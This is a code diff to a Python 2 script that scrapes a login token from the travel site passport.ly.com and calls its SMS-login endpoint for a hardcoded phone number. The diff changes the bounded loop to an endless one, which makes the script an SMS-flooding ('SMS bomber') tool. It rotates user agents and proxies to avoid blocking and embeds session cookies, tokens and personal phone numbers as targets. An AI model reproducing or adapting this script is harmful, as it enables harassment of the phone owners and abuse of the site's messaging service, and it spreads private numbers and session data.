@@ -15,6 +15,7 @@ import lxml.html
 import random
 
 import threadpool
+import time
 
 level = logging.DEBUG
 format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
@@ -95,13 +96,6 @@ USER_AGENT_LIST = [
     'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1.7pre) Gecko/20070815 Firefox/2.0.0.6 Navigator/9.0b3',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.12) Gecko/20080219 Firefox/2.0.0.12 Navigator/9.0.0.6',
 ]
-HEADERS = {
-    "Host": "passport.ly.com",
-    "Origin": "https://passport.ly.com",
-    "Referer": "https://passport.ly.com/m/login.html",
-    "User-Agent": "nfjkasndkasndk",
-    "Cookie": "td=48232be849c74c4797d630af3bbf84ee; qdid=-99999; CNSEInfo=RefId=10758821&tcbdkeyid=&SEFrom=&SEKeyWords=&RefUrl=; 17uCNRefId=10758821; NewProvinceId=16; NCid=224; __tctmc=144323752.96440349; __tctmd=144323752.737325; __tctma=144323752.1475412340880182.1475412340105.1475412340105.1475412340105.1; __tctmb=144323752.901641032243274.1475412907287.1475412932535.17; __tctmu=144323752.0.0; __tctmz=144323752.1475412340105.1.1.utmccn=(direct)|utmcsr=(direct)|utmcmd=(none); longKey=1475412340880182; __tctrack=0; _trackClick=#mainPage>1; __RequestVerificationToken_L20_=zCs7Av6CyweCIbExq/WepSRmWoi3LQFo4acUmkDw4ALmVGNpbK1nlWA4IGVmO/oWI+CegVn3jxu8uxdax6y6MhzYHcw8fCGYBGO4uuJWlM8v0/2d4ou1VWP3FMFBjfiQb6oP2nsPtUCN+EWy8Pun1xVZbaQ3m46cmbCgQ2iDDV4=; route=c79b1ecb8a8d22ca024e66867cc369a4; _fmdata=B29208834D31A611A98A3CF15F0AAA69370ACECFED6593FE464ADEFD5C35054589A376A46BA0BCE277A47CE3415E9B505C896C58259269A3; ASP.NET_SessionId=bbizy0jhrsfociaucdxq2p2v; tongdun=42f4c60b-ac3f-4473-9b35-7d88332add34; passport_login_state=pageurl=http%3a%2f%2fwww.ly.com; Identifier=ssid=bbizy0jhrsfociaucdxq2p2v",
-}
 
 proxies = {"proxies": random.choice(PROXIES)}
 
@@ -117,7 +111,19 @@ class Ly():
         self.phone_no = phone_no
         self.session = requests.Session()
         self.fish = None
-        self.gobalCookies = {}
+        self.globalCookies = {}
+        self.headers = {
+            "Host": "passport.ly.com",
+            "Origin": "https://passport.ly.com",
+            "Referer": "https://passport.ly.com/m/login.html",
+            "User-Agent": random.choice(USER_AGENT_LIST),
+            "Cookie": "td=7979ec045bba43d2ae9d33bb0759eb62; abtestKey=8ee2a1ca-1feb-447d-9231-693a12e18410; NewProvinceId=16; NCid=224; TicketSEInfo=RefId=0&SEFrom=&SEKeyWords=; qdid=-9999; CNSEInfo=RefId=10758821&tcbdkeyid=&SEFrom=&SEKeyWords=&RefUrl=; 17uCNRefId=10758821; locationinfo=%7B%22latitude%22%3A%22%22%2C%22longitude%22%3A%22%22%2C%22city%22%3A%22%E5%8D%97%E4%BA%AC%22%2C%22cityCode%22%3A224%7D; _trackClick=#mainPage>1; __RequestVerificationToken_L20_=NwGr2nQrl9VNDyYMzhAQcieQLz0QRwFRDNi1gy7Z+bW9WIat7+5o6m1iwSgAGnsB9BbQ6Xh+0EFBSYRqnR7avpCNT/CgJ4uqJ6OBVroOfva6zUy0Xw1umnrx9Fx0Qz8m++GFqZbfMRp8W57YSDHrrBxWQ3+ekzRm8JH3uELF/uw=; route=5eb8f102a9c96679f2ea9236f86cbdf0; __tctmc=144323752.131910798; __tctmd=144323752.173394815; __tctma=144323752.1475405455694520.1475405455233.1475583105333.1476458358308.5; __tctmb=144323752.3506814509741689.1476458380382.1476458386900.3; __tctmu=144323752.0.0; __tctmz=144323752.1476458358308.5.1.utmccn=(direct)|utmcsr=(direct)|utmcmd=(none); longKey=1475405455694520; __tctrack=0; _fmdata=430868901C6CDD853BD21D2EA878F714B009EFCFD026F38E73F570F4519008E351F54CD22E1BD49B924320B306EA82B3EADE993B1614E3EE",
+        }
+
+    def first_blood(self):
+        url = "http://m.ly.com/"
+        r = self.session.get(url=url, headers=self.headers,timeout=5)
+        self.globalCookies = self.session.cookies.get_dict()
 
     def get_fish(self):
         """
@@ -127,11 +133,15 @@ class Ly():
         try:
             url = "https://passport.ly.com/m/login.html"
 
-            r = self.session.get(url=url, headers=HEADERS, proxies=proxies,
+            r = self.session.get(url=url, headers=self.headers,
                                  timeout=5)
             h = lxml.html.fromstring(r.content)
             token = ''.join(h.xpath("//form[@id='smslogin']/input[@name ='__RequestVerificationToken']/@value"))
             self.fish = token
+            self.globalCookies = self.session.cookies.get_dict()
+            print self.session.cookies.get_dict()
+            print self.globalCookies
+            print token
 
         except Exception as ex:
             print ex
@@ -142,6 +152,7 @@ class Ly():
         发送短信
         :return:
         """
+
         if self.fish:
             try:
                 url = "https://passport.ly.com/m/login/loginviasms"
@@ -149,13 +160,15 @@ class Ly():
                     "mobile1": self.phone_no,
                     "validCode": '',
                     "__RequestVerificationToken": self.fish,
-                    'returnUrl': '',
+                    'returnUrl': '/fuckly',
                     'action': 1,
                     "mobile": self.phone_no
                 }
 
                 logger.info("短信参数:%s" % data)
-                r = self.session.post(url=url, headers=HEADERS, data=data, proxies=proxies
+
+                r = self.session.post(url=url, headers=self.headers, data=data, cookies=self.globalCookies,
+                                      proxies=proxies
                                       , timeout=5)
                 print r.content
 
@@ -165,10 +178,10 @@ class Ly():
 
 
 def tmp():
-    l = Ly("18020220850")
+    l = Ly("18852996865")
+    # l = Ly("13515105572")
     l.get_fish()
-    # l.send_sms()
-    for i in xrange(0, 100, 1):
+    while True:
         l.send_sms()
 
 
